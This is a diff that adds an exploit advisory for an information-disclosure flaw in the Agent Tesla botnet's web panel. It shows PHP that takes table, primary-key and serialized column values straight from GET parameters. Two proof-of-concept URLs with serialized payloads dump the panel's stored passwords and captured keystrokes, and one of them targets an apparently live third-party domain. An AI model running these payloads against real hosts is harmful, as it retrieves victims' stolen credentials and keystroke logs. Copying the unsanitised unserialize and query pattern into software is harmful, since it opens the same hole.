@@ -1,0 +1,33 @@
+################################
+# Exploit Title: Agent Tesla Botnet - Information Disclosure Disclosure Vulnerability
+# Google Dork: n/a
+# Date: 26/11/2018
+# Exploit Author: n4pst3r
+# Vendor Homepage: unkn0wn
+# Software Link: http://www.agenttesla.com/ ¡ Down !
+# Version: unkn0wn
+# Tested on: Windows 10, debian 7
+# CVE : n/a
+# Greetz: Shell.root, Griever, Telibles
+################################
+# Vuln-Code: http://127.0.0.1/WebPanel/server_side/scripts/server_processing.php
+
+$table = $_GET['table'];
+
+// Table's primary key
+$primaryKey = $_GET['primary'];
+
+if(isset($_GET['where'])){
+	$where = base64_decode($_GET['where']);
+}else{
+	$where = "";
+}
+
+$idArray = unserialize(urldecode($_GET['clmns']));
+
+################################
+PoC Extract full passwords:
+http://127.0.0.1/WebPanel/server_side/scripts/server_processing.php?table=passwords&primary=password_id&clmns=a%3A6%3A%7Bi%3A0%3Ba%3A2%3A%7Bs%3A2%3A%22db%22%3Bs%3A11%3A%22server_time%22%3Bs%3A2%3A%22dt%22%3Bs%3A11%3A%22server_time%22%3B%7Di%3A1%3Ba%3A2%3A%7Bs%3A2%3A%22db%22%3Bs%3A7%3A%22pc_name%22%3Bs%3A2%3A%22dt%22%3Bs%3A7%3A%22pc_name%22%3B%7Di%3A2%3Ba%3A2%3A%7Bs%3A2%3A%22db%22%3Bs%3A6%3A%22client%22%3Bs%3A2%3A%22dt%22%3Bs%3A6%3A%22client%22%3B%7Di%3A3%3Ba%3A2%3A%7Bs%3A2%3A%22db%22%3Bs%3A4%3A%22host%22%3Bs%3A2%3A%22dt%22%3Bs%3A4%3A%22host%22%3B%7Di%3A4%3Ba%3A2%3A%7Bs%3A2%3A%22db%22%3Bs%3A8%3A%22username%22%3Bs%3A2%3A%22dt%22%3Bs%3A8%3A%22username%22%3B%7Di%3A5%3Ba%3A2%3A%7Bs%3A2%3A%22db%22%3Bs%3A3%3A%22pwd%22%3Bs%3A2%3A%22dt%22%3Bs%3A3%3A%22pwd%22%3B%7D%7D
+
+PoC Extract full Keystrokes:
+http://etvidanueva.com/photos/images/WebPanel/server_side/scripts/server_processing.php?table=logs&primary=log_id&clmns=a%3A6%3A%7Bi%3A0%3Ba%3A2%3A%7Bs%3A2%3A%22db%22%3Bs%3A6%3A%22log_id%22%3Bs%3A2%3A%22dt%22%3Bs%3A6%3A%22log_id%22%3B%7Di%3A1%3Ba%3A2%3A%7Bs%3A2%3A%22db%22%3Bs%3A11%3A%22server_time%22%3Bs%3A2%3A%22dt%22%3Bs%3A11%3A%22server_time%22%3B%7Di%3A2%3Ba%3A2%3A%7Bs%3A2%3A%22db%22%3Bs%3A4%3A%22hwid%22%3Bs%3A2%3A%22dt%22%3Bs%3A4%3A%22hwid%22%3B%7Di%3A3%3Ba%3A2%3A%7Bs%3A2%3A%22db%22%3Bs%3A7%3A%22pc_name%22%3Bs%3A2%3A%22dt%22%3Bs%3A7%3A%22pc_name%22%3B%7Di%3A4%3Ba%3A2%3A%7Bs%3A2%3A%22db%22%3Bs%3A3%3A%22log%22%3Bs%3A2%3A%22dt%22%3Bs%3A3%3A%22log%22%3B%7Di%3A5%3Ba%3A2%3A%7Bs%3A2%3A%22db%22%3Bs%3A9%3A%22ip_addres%22%3Bs%3A2%3A%22dt%22%3Bs%3A9%3A%22ip_addres%22%3B%7D%7D
